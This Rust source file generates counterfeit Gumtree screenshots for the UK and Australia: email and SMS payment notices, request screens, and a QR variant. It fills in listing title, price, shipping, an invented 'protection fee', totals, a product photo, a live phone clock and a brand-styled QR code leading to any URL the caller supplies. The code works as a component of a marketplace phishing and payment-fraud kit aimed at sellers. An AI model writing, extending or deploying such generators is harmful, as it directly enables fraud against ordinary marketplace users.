#![cfg(feature = "skia_hb")]

use chrono::Timelike;
use chrono_tz::Tz;
use image::DynamicImage;
use qrcode::{EcLevel, QrCode};
use rust_decimal::Decimal;
use rust_decimal_macros::dec;
use rustybuzz::{Face as HbFace, UnicodeBuffer};
use skia_safe::{
    surfaces, Color, Color4f, Data, EncodedImageFormat, Font as SkFont, FontMgr, FontStyle, Paint,
    PaintStyle, Point, RRect, Rect,
};

use super::GenError;
use crate::{cache::FigmaCache, figma, util};

const PAGE: &str = "Page 2";
const UK_PROTECT_BASE: Decimal = dec!(0.70);
const UK_PROTECT_RATE: Decimal = dec!(0.05);

#[derive(Clone, Copy, Debug)]
pub enum Variant {
    EmailRequest,
    PhoneRequest,
    EmailPayment,
    SmsPayment,
    Qr,
}

impl Variant {
    pub fn parse(s: &str) -> Option<Self> {
        Some(match s {
            "email_request" => Variant::EmailRequest,
            "phone_request" => Variant::PhoneRequest,
            "email_payment" => Variant::EmailPayment,
            "sms_payment" => Variant::SmsPayment,
            "qr" => Variant::Qr,
            _ => return None,
        })
    }
    pub fn frame_index(self) -> u8 {
        match self {
            Variant::EmailRequest => 1,
            Variant::PhoneRequest => 2,
            Variant::EmailPayment => 3,
            Variant::SmsPayment => 4,
            Variant::Qr => 5,
        }
    }
    pub fn has_qr(self) -> bool {
        matches!(self, Variant::Qr)
    }
}

#[derive(Clone, Copy, Debug)]
pub enum Geo {
    Uk,
    Au,
}
impl Geo {
    pub fn parse(s: &str) -> Option<Self> {
        Some(match s {
            "uk" => Geo::Uk,
            "au" => Geo::Au,
            _ => return None,
        })
    }
    pub fn suffix(self) -> &'static str {
        match self {
            Geo::Uk => "uk",
            Geo::Au => "au",
        }
    }
    pub fn currency_symbol(self) -> &'static str {
        match self {
            Geo::Uk => "£",
            Geo::Au => "$",
        }
    }
    pub fn shipping(self) -> Decimal {
        match self {
            Geo::Uk => dec!(2.99),
            Geo::Au => dec!(11.99),
        }
    }
    pub fn timezone(self) -> Tz {
        match self {
            Geo::Uk => chrono_tz::Europe::London,
            Geo::Au => chrono_tz::Australia::Sydney,
        }
    }
}

#[derive(Clone, Copy)]
struct GumtreeQrStyle {
    module_roundness: f32,
    finder_outer_roundness: f32,
    finder_hole_roundness: f32,
    size: u32,
    margin: u32,
    eye_outer_modules: u32,
    eye_hole_modules: u32,
    eye_center_modules: u32,
}

impl Default for GumtreeQrStyle {
    fn default() -> Self {
        Self {
            module_roundness: 0.45,
            finder_outer_roundness: 0.58,
            finder_hole_roundness: 0.65,
            size: 500,
            margin: 2,
            eye_outer_modules: 7,
            eye_hole_modules: 5,
            eye_center_modules: 3,
        }
    }
}

fn scale_factor() -> f32 {
    2.0
}

fn bbox(v: &serde_json::Value) -> Option<(f32, f32, f32, f32)> {
    let bb = v.get("absoluteBoundingBox")?;
    Some((
        bb.get("x")?.as_f64()? as f32,
        bb.get("y")?.as_f64()? as f32,
        bb.get("width")?.as_f64()? as f32,
        bb.get("height")?.as_f64()? as f32,
    ))
}

fn rel_box(
    node: &serde_json::Value,
    frame_node: &serde_json::Value,
) -> Result<(f32, f32, f32, f32), GenError> {
    let (x, y, w, h) =
        bbox(node).ok_or_else(|| GenError::Internal("missing absoluteBoundingBox".into()))?;
    let (fx, fy, _fw, _fh) = bbox(frame_node)
        .ok_or_else(|| GenError::Internal("missing frame absoluteBoundingBox".into()))?;
    let sf = scale_factor();
    Ok(((x - fx) * sf, (y - fy) * sf, w * sf, h * sf))
}

fn font_bytes(name: &str) -> Result<Vec<u8>, GenError> {
    let project_root = std::env::var("PROJECT_ROOT").ok().unwrap_or_else(|| {
        let manifest_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        manifest_dir.join("../..").to_string_lossy().to_string()
    });
    let p = std::path::PathBuf::from(project_root)
        .join("app/assets/fonts")
        .join(name);
    std::fs::read(&p).map_err(|e| GenError::Internal(format!("failed to read font {name}: {e}")))
}

fn hb_text_width(
    font_data: &[u8],
    px: f32,
    text: &str,
    letter_spacing: f32,
) -> Result<f32, GenError> {
    if text.is_empty() {
        return Ok(0.0);
    }
    let face = HbFace::from_slice(font_data, 0)
        .ok_or_else(|| GenError::Internal("failed to parse hb face".into()))?;
    let mut buf = UnicodeBuffer::new();
    buf.push_str(text);
    let glyph_buf = rustybuzz::shape(&face, &[], buf);
    let infos = glyph_buf.glyph_infos();
    let poss = glyph_buf.glyph_positions();
    let upem = face.units_per_em() as f32;
    let scale = px / upem;
    let mut x = 0.0f32;
    for (i, p) in poss.iter().enumerate() {
        x += p.x_advance as f32 * scale;
        if i + 1 < infos.len() {
            x += letter_spacing;
        }
    }
    Ok(x.max(0.0))
}

fn truncate_to_width(
    font_data: &[u8],
    px: f32,
    text: &str,
    max_width: f32,
    letter_spacing: f32,
) -> Result<String, GenError> {
    if hb_text_width(font_data, px, text, letter_spacing)? <= max_width {
        return Ok(text.to_string());
    }
    let ellipsis = "...";
    let mut out = text.to_string();
    while !out.is_empty()
        && hb_text_width(font_data, px, &(out.clone() + ellipsis), letter_spacing)? > max_width
    {
        out.pop();
    }
    Ok(if out.is_empty() {
        ellipsis.to_string()
    } else {
        format!("{out}{ellipsis}")
    })
}

fn split_title_two_lines(
    font_data: &[u8],
    px: f32,
    text: &str,
    max_width: f32,
    letter_spacing: f32,
) -> Result<(String, String), GenError> {
    let clean = text.trim();
    if clean.is_empty() {
        return Ok((String::new(), String::new()));
    }
    if hb_text_width(font_data, px, clean, letter_spacing)? <= max_width {
        return Ok((clean.to_string(), String::new()));
    }
    let words: Vec<&str> = clean.split_whitespace().collect();
    let mut line1 = String::new();
    let mut idx = 0usize;
    while idx < words.len() {
        let c = if line1.is_empty() {
            words[idx].to_string()
        } else {
            format!("{} {}", line1, words[idx])
        };
        if hb_text_width(font_data, px, &c, letter_spacing)? <= max_width {
            line1 = c;
            idx += 1;
        } else {
            break;
        }
    }
    let line2 = truncate_to_width(
        font_data,
        px,
        &words[idx..].join(" "),
        max_width,
        letter_spacing,
    )?;
    Ok((line1, line2))
}

fn draw_text(
    canvas: &skia_safe::Canvas,
    mgr: &FontMgr,
    family: &str,
    px: f32,
    x: f32,
    y: f32,
    rgba: [u8; 4],
    text: &str,
) {
    let tf = mgr
        .match_family_style(family, FontStyle::normal())
        .or_else(|| mgr.legacy_make_typeface(None, FontStyle::normal()));
    if let Some(tf) = tf {
        let font = SkFont::from_typeface(tf, px);
        let mut p = Paint::default();
        p.set_anti_alias(true);
        p.set_color(
            Color4f::new(
                rgba[0] as f32 / 255.0,
                rgba[1] as f32 / 255.0,
                rgba[2] as f32 / 255.0,
                rgba[3] as f32 / 255.0,
            )
            .to_color(),
        );
        // Deterministic box alignment rule: draw baseline at top + cap-height approximation.
        // This is stable across runs and avoids per-node magic offsets.
        let baseline = y + px * 0.86;
        canvas.draw_str(text, Point::new(x, baseline), &font, &p);
    }
}

fn format_currency(geo: Geo, value: Decimal) -> String {
    let v = value.round_dp_with_strategy(2, rust_decimal::RoundingStrategy::MidpointAwayFromZero);
    format!("{}{:.2}", geo.currency_symbol(), v)
}
fn protection_fee_uk(price: Decimal) -> Decimal {
    (UK_PROTECT_BASE + price * UK_PROTECT_RATE)
        .round_dp_with_strategy(2, rust_decimal::RoundingStrategy::MidpointAwayFromZero)
}

fn product_photo_from_b64(
    photo_b64: &str,
    w: u32,
    h: u32,
) -> Result<Option<DynamicImage>, GenError> {
    let Some(bytes) = util::b64_decode(photo_b64) else {
        return Ok(None);
    };
    let img = image::load_from_memory(&bytes)
        .map_err(|e| GenError::BadRequest(format!("invalid photo: {e}")))?;
    let mut img = img.to_rgba8();
    let target_ratio = w as f32 / h as f32;
    let src_ratio = img.width() as f32 / img.height() as f32;
    let (crop_w, crop_h) = if src_ratio > target_ratio {
        (
            (img.height() as f32 * target_ratio).round() as u32,
            img.height(),
        )
    } else {
        (
            img.width(),
            (img.width() as f32 / target_ratio).round() as u32,
        )
    };
    let left = (img.width().saturating_sub(crop_w)) / 2;
    let top = (img.height().saturating_sub(crop_h)) / 2;
    let cropped = image::imageops::crop(&mut img, left, top, crop_w, crop_h).to_image();
    let resized = image::imageops::resize(&cropped, w, h, image::imageops::FilterType::Lanczos3);
    Ok(Some(DynamicImage::ImageRgba8(resized)))
}

fn is_eye(x: u32, y: u32, w: u32) -> bool {
    (x < 7 && y < 7) || (x + 7 >= w && y < 7) || (x < 7 && y + 7 >= w)
}

fn draw_qr_skia(
    canvas: &skia_safe::Canvas,
    x: f32,
    y: f32,
    size: f32,
    url: &str,
    style: GumtreeQrStyle,
) -> Result<(), GenError> {
    let qr = QrCode::with_error_correction_level(url.as_bytes(), EcLevel::H)
        .map_err(|e| GenError::Internal(e.to_string()))?;
    let w = qr.width() as u32;
    let total = w + 2 * style.margin;
    let module = size / total as f32;

    let mut dark = Paint::default();
    dark.set_anti_alias(true);
    dark.set_style(PaintStyle::Fill);
    dark.set_color(Color::from_argb(255, 8, 97, 119));
    let mut light = Paint::default();
    light.set_style(PaintStyle::Fill);
    light.set_color(Color::WHITE);

    canvas.draw_rect(Rect::from_xywh(x, y, size, size), &light);

    let mrad = (module * style.module_roundness).max(0.0);
    for my in 0..w {
        for mx in 0..w {
            if is_eye(mx, my, w) {
                continue;
            }
            if !matches!(qr[(mx as usize, my as usize)], qrcode::Color::Dark) {
                continue;
            }
            let rx = x + (mx + style.margin) as f32 * module;
            let ry = y + (my + style.margin) as f32 * module;
            let rr = RRect::new_rect_xy(Rect::from_xywh(rx, ry, module, module), mrad, mrad);
            canvas.draw_rrect(rr, &dark);
        }
    }

    let draw_eye = |canvas: &skia_safe::Canvas, sxm: u32, sym: u32| {
        let ox = x + sxm as f32 * module;
        let oy = y + sym as f32 * module;
        let outer = style.eye_outer_modules as f32 * module;
        let hole = style.eye_hole_modules as f32 * module;
        let center = style.eye_center_modules as f32 * module;
        let outer_r = module * style.finder_outer_roundness;
        let hole_r = module * style.finder_hole_roundness;

        canvas.draw_rrect(
            RRect::new_rect_xy(Rect::from_xywh(ox, oy, outer, outer), outer_r, outer_r),
            &dark,
        );
        canvas.draw_rrect(
            RRect::new_rect_xy(
                Rect::from_xywh(ox + module, oy + module, hole, hole),
                hole_r,
                hole_r,
            ),
            &light,
        );
        canvas.draw_rrect(
            RRect::new_rect_xy(
                Rect::from_xywh(ox + 2.0 * module, oy + 2.0 * module, center, center),
                hole_r,
                hole_r,
            ),
            &dark,
        );
    };

    draw_eye(canvas, style.margin, style.margin);
    draw_eye(canvas, style.margin + (w - 7), style.margin);
    draw_eye(canvas, style.margin, style.margin + (w - 7));
    Ok(())
}

pub async fn generate_gumtree_skia_hb(
    http: &reqwest::Client,
    country: &str,
    method: &str,
    title: &str,
    price: f64,
    photo_b64: Option<&str>,
    url: Option<&str>,
) -> Result<Vec<u8>, GenError> {
    let variant = Variant::parse(method)
        .ok_or_else(|| GenError::BadRequest(format!("unknown gumtree method: {method}")))?;
    let geo = Geo::parse(country).ok_or_else(|| {
        GenError::BadRequest(format!(
            "gumtree supports only country=uk|au (got: {country})"
        ))
    })?;
    if variant.has_qr() && url.map(|s| s.trim().is_empty()).unwrap_or(true) {
        return Err(GenError::BadRequest("url is required for qr".into()));
    }

    let frame_base = format!("gumtree{}", variant.frame_index());
    let frame_name = format!("{}_{}", frame_base, geo.suffix());
    let service_name = format!("gumtree_{}_{}", method, geo.suffix());

    let cache = FigmaCache::new(service_name);
    let (template_json, frame_png, frame_node, used_cache) = if cache.exists() {
        let (structure, png) = cache.load()?;
        if let Some(node) = figma::find_node(&structure, PAGE, &frame_name) {
            (structure, png, node, true)
        } else {
            let structure = figma::get_template_json(http).await?;
            let node = figma::find_node(&structure, PAGE, &frame_name)
                .ok_or_else(|| GenError::BadRequest(format!("frame not found: {frame_name}")))?;
            (structure, Vec::new(), node, false)
        }
    } else {
        let structure = figma::get_template_json(http).await?;
        let node = figma::find_node(&structure, PAGE, &frame_name)
            .ok_or_else(|| GenError::BadRequest(format!("frame not found: {frame_name}")))?;
        (structure, Vec::new(), node, false)
    };

    let frame_png = if used_cache {
        frame_png
    } else {
        let node_id = frame_node
            .get("id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| GenError::Internal("frame node missing id".into()))?;
        let png = figma::export_frame_as_png(http, node_id, Some(2)).await?;
        cache.save(&template_json, &png)?;
        png
    };

    let bg = image::load_from_memory(&frame_png)
        .map_err(|e| GenError::Image(e.to_string()))?
        .to_rgba8();
    let mut surface = surfaces::raster_n32_premul((bg.width() as i32, bg.height() as i32))
        .ok_or_else(|| GenError::Internal("failed to create skia surface".into()))?;
    let canvas = surface.canvas();

    let data = Data::new_copy(bg.as_raw());
    let base = skia_safe::images::raster_from_data(
        &skia_safe::ImageInfo::new_n32_premul((bg.width() as i32, bg.height() as i32), None),
        data,
        (bg.width() * 4) as usize,
    )
    .ok_or_else(|| GenError::Internal("failed to map frame image".into()))?;
    canvas.draw_image(&base, (0, 0), None);

    let node = |name: &str| -> Result<serde_json::Value, GenError> {
        figma::find_node(&template_json, PAGE, name)
            .ok_or_else(|| GenError::BadRequest(format!("node not found: {name}")))
    };
    let node_opt =
        |name: &str| -> Option<serde_json::Value> { figma::find_node(&template_json, PAGE, name) };

    let title_font_data = font_bytes("ReadexPro-SemiBold.ttf")?;
    let mgr = FontMgr::new();

    let title_l1_node = node(&format!("nazv_str1_{frame_name}"))?;
    let title_l2_node = node(&format!("nazv_str2_{frame_name}"))?;
    let title_px = 45.0 * scale_factor() * 1.26;
    let (line1, line2) = split_title_two_lines(
        &title_font_data,
        title_px,
        title,
        912.0 * scale_factor(),
        0.0,
    )?;
    let (x1, y1, _w1, _h1) = rel_box(&title_l1_node, &frame_node)?;
    draw_text(
        canvas,
        &mgr,
        "Readex Pro",
        title_px,
        x1,
        y1,
        [26, 48, 60, 255],
        &line1,
    );
    if !line2.is_empty() {
        let (x2, y2, _w2, _h2) = rel_box(&title_l2_node, &frame_node)?;
        draw_text(
            canvas,
            &mgr,
            "Readex Pro",
            title_px,
            x2,
            y2,
            [26, 48, 60, 255],
            &line2,
        );
    }

    let price_dec = Decimal::from_f64_retain(price)
        .unwrap_or(dec!(0))
        .round_dp_with_strategy(2, rust_decimal::RoundingStrategy::MidpointAwayFromZero);
    let price_text = format_currency(geo, price_dec);
    let price_node_name = if line2.is_empty() {
        format!("price_if1str_{frame_name}")
    } else {
        format!("price_if2str_{frame_name}")
    };
    let price_node = node(&price_node_name)?;
    let (px, py, _pw, _ph) = rel_box(&price_node, &frame_node)?;
    draw_text(
        canvas,
        &mgr,
        "Readex Pro",
        title_px,
        px,
        py,
        [0, 136, 62, 255],
        &price_text,
    );

    let subtotal_node = node(&format!("subtotalprice_{frame_name}"))?;
    let (sx, sy, sw, _sh) = rel_box(&subtotal_node, &frame_node)?;
    let subtotal_w = hb_text_width(&title_font_data, title_px, &price_text, 0.0)?;
    draw_text(
        canvas,
        &mgr,
        "Readex Pro",
        title_px,
        sx + sw - subtotal_w,
        sy,
        [26, 48, 60, 255],
        &price_text,
    );

    let mut total = price_dec + geo.shipping();
    if matches!(geo, Geo::Uk) {
        let protect = protection_fee_uk(price_dec);
        total += protect;
        let protect_text = format_currency(geo, protect);
        let protect_node = node(&format!("protect_{frame_name}"))?;
        let (prx, pry, prw, _prh) = rel_box(&protect_node, &frame_node)?;
        let ww = hb_text_width(&title_font_data, title_px, &protect_text, 0.0)?;
        draw_text(
            canvas,
            &mgr,
            "Readex Pro",
            title_px,
            prx + prw - ww,
            pry,
            [26, 48, 60, 255],
            &protect_text,
        );
    }

    let total_text = format_currency(geo, total);
    let total_node = node(&format!("totalprice_{frame_name}"))?;
    let (tx, ty, tw, _th) = rel_box(&total_node, &frame_node)?;
    let total_w = hb_text_width(&title_font_data, title_px, &total_text, 0.0)?;
    draw_text(
        canvas,
        &mgr,
        "Readex Pro",
        title_px,
        tx + tw - total_w,
        ty,
        [26, 48, 60, 255],
        &total_text,
    );

    if let Some(final_total_node) = node_opt(&format!("finaltotalprice_{frame_name}")) {
        let (fx, fy, fw, _fh) = rel_box(&final_total_node, &frame_node)?;
        draw_text(
            canvas,
            &mgr,
            "Readex Pro",
            title_px,
            fx + fw - total_w,
            fy,
            [26, 48, 60, 255],
            &total_text,
        );
    }

    if let Some(photo_b64) = photo_b64 {
        let pic_node = node(&format!("pic_{frame_name}"))?;
        let (ix, iy, iw, ih) = rel_box(&pic_node, &frame_node)?;
        if let Some(img) = product_photo_from_b64(photo_b64, iw.round() as u32, ih.round() as u32)?
        {
            let img = img.to_rgba8();
            let data = Data::new_copy(img.as_raw());
            if let Some(skimg) = skia_safe::images::raster_from_data(
                &skia_safe::ImageInfo::new_n32_premul(
                    (img.width() as i32, img.height() as i32),
                    None,
                ),
                data,
                (img.width() * 4) as usize,
            ) {
                canvas.draw_image(&skimg, (ix, iy), None);
            }
        }
    }

    let time_node = node(&format!("time_{frame_name}"))?;
    let now = chrono::Utc::now().with_timezone(&geo.timezone());
    let time_text = format!("{:02}:{:02}", now.hour(), now.minute());
    let (bx, by, bw, _bh) = rel_box(&time_node, &frame_node)?;
    let time_px = 120.0;
    let tw = hb_text_width(
        &font_bytes("SFProText-Semibold.ttf")?,
        time_px,
        &time_text,
        0.0,
    )?;
    draw_text(
        canvas,
        &mgr,
        "SF Pro Text",
        time_px,
        bx + (bw - tw) * 0.5,
        by,
        [0, 0, 0, 255],
        &time_text,
    );

    if variant.has_qr() {
        let qr_node = node(&format!("qr_{frame_name}"))?;
        let url = url.unwrap_or_default();
        let (qx, qy, qw, qh) = rel_box(&qr_node, &frame_node)?;
        let side = qw.min(qh);
        draw_qr_skia(
            canvas,
            qx + (qw - side) * 0.5,
            qy + (qh - side) * 0.5,
            side,
            url,
            GumtreeQrStyle::default(),
        )?;
    }

    let snapshot = surface.image_snapshot();
    let png = snapshot
        .encode(None, EncodedImageFormat::PNG, 100)
        .ok_or_else(|| GenError::Image("failed to encode skia png".into()))?;
    Ok(png.as_bytes().to_vec())
}
